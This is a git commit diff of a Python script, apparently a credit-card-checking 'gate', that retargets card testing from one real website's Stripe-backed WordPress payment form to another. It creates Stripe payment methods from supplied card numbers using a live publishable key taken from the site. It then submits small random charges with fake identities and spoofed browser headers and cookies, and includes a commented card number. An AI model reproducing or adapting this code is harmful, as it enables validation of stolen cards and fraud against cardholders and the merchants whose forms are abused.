d78bd94d88e729517e592c5964ec08e98b0ed875
lightyagami210618 <genpaypal03@gmail.com>
2026-08-11 21:18:59 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -24,7 +24,7 @@ def generate_address():
     return street_address, city, "GB", zip_code, f"07{random.randint(100000000, 999999999)}"
 
 def generate_email():
-    return f"user{random.randint(10000,99999)}@example.com"
+    return f"rodamuser{random.randint(10000,99999)}@gmail.com"
 
 def generate_username():
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
@@ -58,8 +58,11 @@ def Tele(ccx):
     username = generate_username()
     corr = generate_random_code()
     sess = generate_random_code()
-    nr = random.randint(100000, 999999)
-    lr = random.randint(1000, 9999)
+    nr = random.randint(50, 99)
+    lr = random.randint(0, 1)
+    amount = f'{lr}.{nr}'
+    print(amount)
+    #print(email)
     
     headers = {
         'authority': 'api.stripe.com',
@@ -77,47 +80,55 @@ def Tele(ccx):
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
     }
     
-    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F39cf6f66b0%3B+stripe-js-v3%2F39cf6f66b0%3B+card-element&referrer=https%3A%2F%2Fwww.weprintitnow.com&time_on_page=93905&client_attribution_metadata[client_session_id]=8e0a2779-b1b6-4248-a108-9663b225fc83&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=f883efe4-d113-46b8-8428-c4b6576e0823&key=pk_live_51QT6eDFtzybSIT2n1IlBWssiCralsgg5AQDn4k7Vvg7UMsK6gZmqJKkyHgSSdYifP4ZoX3uewYTVOEIqCvh8XXWl00zag4wf96'
+    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F4dae3e22af%3B+stripe-js-v3%2F4dae3e22af%3B+card-element&referrer=https%3A%2F%2Fwww.aimovieawards.org&time_on_page=129615&key=pk_live_51SRs8FPeisNgKGtQGZZKGzlrMefQcH3GyTEVw4E5CB9r0qg4pBQTuagBcRK25cfrp7s8G182eyBJ0ZoJSqQSrfs800aWBepVyw'
     
     response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
     
     pm = response.json()['id']
     
     cookies = {
-        '__stripe_mid': 'b0d13f02-d87a-4c1c-b690-18cd9e8a1dac94c074',
-        '__stripe_sid': '82939201-0989-4722-822f-290d00249e7fa4ad60',
+        '_ga': 'GA1.1.1062979907.1786456842',
+        'sbjs_migrations': '1418474375998%3D1',
+        'sbjs_current_add': 'fd%3D2026-08-11%2014%3A00%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.aimovieawards.org%2Fsubmit%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+        'sbjs_first_add': 'fd%3D2026-08-11%2014%3A00%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.aimovieawards.org%2Fsubmit%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+        'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+        'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
+        'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.aimovieawards.org%2Fsubmit%2F',
+        'tk_or': '%22https%3A%2F%2Fwww.google.com%2F%22',
+        'tk_r3d': '%22https%3A%2F%2Fwww.google.com%2F%22',
+        'tk_lr': '%22https%3A%2F%2Fwww.google.com%2F%22',
+        'tk_ai': '5Y/Czywuemc/+S9bcXJ9lG66',
+        '__stripe_mid': 'c0817b3f-1f63-4816-817a-061438971687c09486',
+        '__stripe_sid': '16d7f413-2d12-4333-8151-2e789669bc80770c83',
+        '_ga_B86Y06F6FJ': 'GS2.1.s1786456841$o1$g1$t1786456972$j20$l0$h0',
     }
     
     headers = {
-        'Accept': '*/*',
-        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        # 'Cookie': '__stripe_mid=b0d13f02-d87a-4c1c-b690-18cd9e8a1dac94c074; __stripe_sid=82939201-0989-4722-822f-290d00249e7fa4ad60',
-        'Origin': 'https://www.weprintitnow.com',
-        'Referer': 'https://www.weprintitnow.com/order-prints/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-        'X-Requested-With': 'XMLHttpRequest',
+        'authority': 'www.aimovieawards.org',
+        'accept': '*/*',
+        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'origin': 'https://www.aimovieawards.org',
+        'referer': 'https://www.aimovieawards.org/submit/',
         'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+        'x-requested-with': 'XMLHttpRequest',
     }
     
     params = {
-        't': '1784624952226',
+        't': '1786456973537',
     }
     
-    data = {
-        'data': f'__fluent_form_embded_post_id=914&_fluentform_3_fluentformnonce=6db0dd7a88&_wp_http_referer=%2Forder-prints%2F&names%5Bfirst_name%5D=Yell&names%5Blast_name%5D=Htet&email=rodamuser08%40gmail.com&phone=4303000850&dropdown=Circulars&payment_input=Test%20item%20-%20%241.00%20USD&address_1%5Baddress_line_1%5D=27%20Allen%20St&address_1%5Bcity%5D=New%20York&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10002&payment_method=stripe&__stripe_payment_method_id={pm}',
-        'action': 'fluentform_submit',
-        'form_id': '3',
-    }
+    data = f'data=ak_hp_textarea%3D%26ak_js%3D1786456841173%26__fluent_form_embded_post_id%3D7032%26_fluentform_4_fluentformnonce%3Dbf83c3dcbe%26_wp_http_referer%3D%252Fsubmit%252F%26names%255Bfirst_name%255D%3D{first_name}%26names%255Blast_name%255D%3D{last_name}%26email%3D{email}%26country-list%3DTH%26input_text%3DMPT%26url%3Dhttps%253A%252F%252Fmpt.com.mm%252Fimages%26checkbox%255B%255D%3DArt%2520%257C%2520Image%2520(20%25E2%2582%25AC)%26custom-payment-amount%3D{amount}%26payment-coupon%3D%26payment_method%3Dstripe%26__ff_all_applied_coupons%3D%26image-upload%255B%255D%3Dhttps%253A%252F%252Fwww.aimovieawards.org%252Fwp-content%252Fuploads%252Ffluentform%252Ftemp%252FzGdjXFdBPYcWYulwA7idUT66t9F7YOAaVpCNV1tDOycvkPiteDr5pC7PZN6nRmVyvIPfTrmM186XF5oPD9o5PjeE81%252FDZey8mLuC0vgLHGy6xghnRfvWjZfXvzrLgEKqxF6Lt4X1CePYuuLPBxeUFQ%253D%253D%26__stripe_payment_method_id%3D{pm}&action=fluentform_submit&form_id=4'
     
     response = requests.post(
-        'https://www.weprintitnow.com/wp-admin/admin-ajax.php',
+        'https://www.aimovieawards.org/wp-admin/admin-ajax.php',
         params=params,
         cookies=cookies,
         headers=headers,
@@ -125,5 +136,5 @@ def Tele(ccx):
     )
     return response.text
     
-#test_card = "4001421623736484|03|29|855"
+#test_card = "4483860050445076|11|26|905"
 #print(Tele(test_card))
